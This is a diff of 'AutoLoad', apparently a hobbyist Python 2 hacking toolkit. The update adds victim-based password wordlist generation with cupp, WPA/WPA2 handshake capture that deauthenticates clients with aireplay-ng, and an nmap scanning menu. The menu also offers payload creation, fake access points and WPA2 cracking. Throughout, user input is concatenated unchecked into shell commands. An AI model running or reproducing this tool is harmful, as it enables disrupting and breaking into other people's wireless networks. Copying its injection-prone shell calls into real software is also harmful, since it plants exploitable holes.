@@ -22,7 +22,7 @@ print(Fore.GREEN +"       / _ \| | | | __/ _ \| |  | | | |/ _` |/ _` |  |"+Fore.
 print(Fore.GREEN +"      / ___ \ |_| | || (_) | |__| |_| | (_| | (_| |  |"+Fore.WHITE +"http://majorhacke.blogspot.com/")
 print(Fore.GREEN +"     /_/   \_\__,_|\__\___/|_____\___/ \__,_|\__,_|  |"+Fore.BLUE +"::::::::Facebook::::::::")
 print(Fore.GREEN +"                Automatic Your Proccess              |"+Fore.WHITE +"http://facebook.com/majorhacke ")
-print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.1"+Fore.GREEN +"]     |")
+print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.2"+Fore.GREEN +"]     |")
 print(Fore.GREEN +"====================================================================================")
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -38,7 +38,7 @@ def check_internet():
     except socket.gaierror as e:
         print("Not Connected to the Internet")
         print("Internet Required")
-        user_input=raw_input("Press Any key to Go back...")
+        user_input=raw_input(Fore.YELLOW +"Press Any key to Go back...")
         import Autoload
     else:
         print(Fore.GREEN +"Connected")
@@ -119,7 +119,7 @@ def helppp():
     print("Name of the File: payload")
     print("File Save to[add '/' in the end]: /root/payload/")
     print("")
-    user_input=raw_input("Press Any key to Go back...")
+    user_input=raw_input(Fore.YELLOW +"Press Any key to Go back...")
     os.system('clear')
     import Autoload
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -211,7 +211,7 @@ def check_ip():
     print("Your Public IP is: ")
     public_ip=os.system('curl -s ipinfo.io/ip')
     print("")
-    user_input=raw_input("Press Any key to Go back...")
+    user_input=raw_input(Fore.YELLOW +"Press Any key to Go back...")
     import Autoload
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 def brute_force():
@@ -238,13 +238,237 @@ def brute_force():
             print(Fore.RED +"Try Again")
         
     
+def victim():
+    os.system('clear')
+    print("")
+    print(Fore.GREEN +"[*]::::::Create a Victim info Based Wordlist using Cupp::::::")
+    print("")
+    print(Fore.BLUE +"1.) Create a Wordlist")
+    print("")
+    print("2.) Download huge wordlists from repository ")
+    print("")
+    userif = ''
+    while not(userif == '1' or userif == '2'):
+        userif=raw_input("[autoload:] > ")
+        if userif == '1':
+            os.system('clear')
+            os.system('python /usr/share/cupp.py -i')
+            print(Fore.GREEN +"File Saved to /root/AutoLoad/ ")
+            print("")
+            userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+            os.system('autoload')
+        elif userif == '2':
+            os.system('clear')
+            os.system('python /usr/share/cupp.py -l')
+            
+        else:
+            print(Fore.RED +"Try Again")
+            print(Fore.BLUE)
+        
     
+def capturehand():
+    os.system('clear')
+    print("")
+    print(Fore.GREEN +"[*]::::::Capture WPA-WPA2 Handshake::::::")
+    print("")
+    print(Fore.BLUE +"1.) Scan for Available Network")
+    print("2.) Select Target and start capturing")
+    print("3.) Enable Monitor Mode")
+    print("4.) Disable Monitor Mode")
+    print("5.) Back")
+    print("6.) Exit")
+    print("")
+
+    def startcap():
+        try:
+            os.system('clear')
+            print("")
+            print(Fore.GREEN +"[*]::::::Start Capturing WPA-WPA2 Handshake::::::")
+            print("     [Just copy and paste the essid]")
+            print("")
+            apmac=raw_input(Fore.BLUE +"[Enter the AP Essid(MAC):] > ")
+            print(Fore.YELLOW +"                                                please close the scan terminal before hitting enter!")
+            channel=raw_input(Fore.BLUE +"[Enter the channel number:] > ")
+            print("")
+            print(Fore.YELLOW +"press ctrl-c when you see [ WPA handshake:] on the terminal")
+            print("File is storing in /root/AutoLoad/handshake")
+            os.system('gnome-terminal --window  -- airodump-ng --bssid '+apmac+' --channel '+channel+' --write /root/AutoLoad/handshakes/handshake ' +monitor)
+            print("")
+            cmac=raw_input(Fore.BLUE +"[Enter the Client's MAC:] > ")
+            os.system('clear')
+            os.system('xterm -geometry 60x15+0+999999 -e aireplay-ng --deauth 20 -a ' +apmac+ ' -c ' +cmac +' '+ monitor)
+            os.system('clear')
+        except KeyboardInterrupt:
+            print("")
+            print(Fore.GREEN +"Thanks For Using AutoLoad!")
+            sys.exit()
+    userif = ''
+    while not(userif == '1' or userif == '2'):
+        userif=raw_input("[autoload:] > ")
+        if userif == '1':
+            os.system('clear')
+            os.system('gnome-terminal --window  -- airodump-ng '+monitor)
+            capturehand()
+        elif userif == '2':
+            startcap()
+            capture_hand()
+        elif userif == '3':
+            os.system('airmon-ng start '+managed)
+            print("Done..")
+            capturehand()
+        elif userif == '4':
+            os.system('airmon-ng stop '+monitor)
+            print("Done..")
+            capturehand()
+        elif userif == '5':
+            os.system('clear')
+            import Autoload
+        elif userif == '6':
+            print("")
+            print("Thanks For Using AutoLoad")
+            sys.exit()
+        else:
+            print("Wrong Choice")
+            os.system('clear')
+            capture_hand()
+    
+def nmaps():
+    os.system('clear')
+    print("")
+    print(Fore.GREEN +"[*]::::::Scan Hosts using nmap::::::")
+    print("")
+    print(Fore.BLUE +"1.) Discover Hosts")
+    print("")
+    print("2.) Select Target")
+    print("3.) Normal Scan on Target")
+    print("4.) Ping Scan on Target")
+    print("5.) Intense Scan Target")
+    print("6.) Service/version Scan on Target")
+    print("7.) OS detection on Target")
+    print("")
+    print("8.) Back")
+    print("9.) Exit")
+    userif = ''
+    while True:
+        print("")
+        userif=raw_input("[autoload:] > ")
+        if userif == '1':
+            os.system('clear')
+            print("EX.[all host] - 192.168.43.1-255")
+            print("EX.[Single Host] - 192.168.43.55")
+            print("")
+            rang=raw_input("[Specify Range to scan:] >")
+            os.system('nmap '+rang)
+            userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+            nmaps()
+        elif userif == '2':
+            os.system('clear')
+            print("")
+            print("")
+            targ=raw_input("[Select target:] >")
+            os.system('echo '+targ+' > /root/AutoLoad/target | touch /root/AutoLoad/target')
+            nmaps()
+        elif userif == '3':
+            try:
+                target=open('/root/AutoLoad/target').read()
+                print(Fore.GREEN +":::::::NORMAL SCAN::::::")
+                print("")
+                print(Fore.YELLOW +"[] Scanning..........")
+                print(Fore.GREEN)
+                os.system('nmap '+target)
+                print("")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            except IOError:
+                print(Fore.RED +"Please Select a Target First!!!")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            else:
+                os.system('nmap '+target)
+        elif userif == '4':
+            try:
+                target=open('/root/AutoLoad/target').read()
+                print(Fore.GREEN +":::::::PING SCAN::::::")
+                print("")
+                print(Fore.YELLOW +"[] Scanning..........")
+                print(Fore.GREEN)
+                os.system('nmap '+target+' -sn')
+                print("")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            except IOError:
+                print(Fore.RED +"Please Select a Target First!!!")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            else:
+                os.system('nmap '+target+' -sn')
+        elif userif == '5':
+            try:
+                target=open('/root/AutoLoad/target').read()
+                print(Fore.GREEN +":::::::INTENSE SCAN::::::")
+                print("")
+                print(Fore.YELLOW +"[] Scanning..........")
+                print(Fore.GREEN)
+                os.system('nmap -T4 -A -v '+target)
+                print("")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            except:
+                print(Fore.RED +"Please Select a Target First!!!")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            else:
+                os.system('nmap -T4 -A -v '+target)
+        elif userif == '6':
+            try:
+                target=open('/root/AutoLoad/target').read()
+                print(Fore.GREEN +":::::::Service and Version Detection::::::")
+                print("")
+                print(Fore.YELLOW +"[] Scanning..........")
+                print(Fore.GREEN)
+                os.system('nmap '+target+' -sV')
+                print("")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            except:
+                print(Fore.RED +"Please Select a Target First!!!")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            else:
+                os.system('nmap '+target+' -sV')
+        elif userif == '7':
+            try:
+                target=open('/root/AutoLoad/target').read()
+                print(Fore.GREEN +":::::::Operating System Detection::::::")
+                print("")
+                print(Fore.YELLOW +"[] Scanning..........")
+                print(Fore.GREEN)
+                os.system('nmap '+target+' -O')
+                print("")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            except:
+                print(Fore.RED +"Please Select a Target First!!!")
+                userrr=raw_input(Fore.YELLOW +"press any key to go back...")
+                nmaps()
+            else:
+                os.system('nmap '+target+' -O')
+        elif userif == '8':
+            os.system('clear')
+            import Autoload
+        elif userif == '9':
+            print("")
+            print(Fore.GREEN +"Thanks For Using AutoLoad")
+            sys.exit()
+        else:
+            print(Fore.RED +"Try Again")
+            print(Fore.BLUE)    
 #------------------------------------------------------------------------------------------------------------------------------------------------------------        
 print("")
-print("|1.)"+Fore.WHITE +" Create Payload         "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +     "    |11.)"+Fore.WHITE +" Help")
-print(Fore.GREEN +"|2.)"+Fore.WHITE +"                    "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN + "    |22.)"+Fore.WHITE +" Update")
-print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP         "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN +"|33.)"+Fore.WHITE +" Exit  ")
-print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack          "+Fore.GREEN +"|                    "+Fore.GREEN +"    |      ")
+print("|1.)"+Fore.WHITE +" Create Payload       "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +      "     |11.)"+Fore.WHITE +" Nmap Scan")
+print(Fore.GREEN +"|2.)"+Fore.WHITE +" Create a Wordlist    "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN +  "     |22.)"+Fore.WHITE +" Help")
+print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP       "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN + " |33.)"+Fore.WHITE +" Update  ")
+print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack        "+Fore.GREEN +"|8.)"+Fore.WHITE +" Capture Handshake  "+Fore.GREEN + "  |55.)"+Fore.WHITE +" Exit")
 print("")
 while True:
     try:
@@ -252,16 +476,12 @@ while True:
         if user == 1:
             payloads()
         elif user == 2:
-            pass
+            victim()
         elif user == 11:
-            print (helpi)
+            nmaps()
         elif user == 33:
-            print("")
-            print(Fore.GREEN +"Thanks for using AutoLOad")
-            print("Goodbye!!")
-            print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
-            print("")
-            sys.exit()
+            check_internet()
+            os.system('python /usr/share/updater.py')
         elif user == 3:
             fakeap()
         elif user == 4:
@@ -278,10 +498,18 @@ while True:
         elif user == 7:
             brute_force()
         elif user == 22:
-            check_internet()
-            os.system('python /usr/share/updater.py')
+            print(helpi)
         elif user == 'clear':
             os.system('clear')
+        elif user == 8:
+            capturehand()
+        elif user == 55:
+            print("")
+            print(Fore.GREEN +"Thanks for using AutoLOad")
+            print("Goodbye!!")
+            print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
+            print("")
+            sys.exit()
         else:
             print(Fore.RED +"Wrong Choice")
         continue
@@ -289,6 +517,8 @@ while True:
         print("")
         print(Fore.GREEN +"Thanks For Using AutoLoad!")
         sys.exit()
+    except SyntaxError:
+        import Autoload
 
 
 
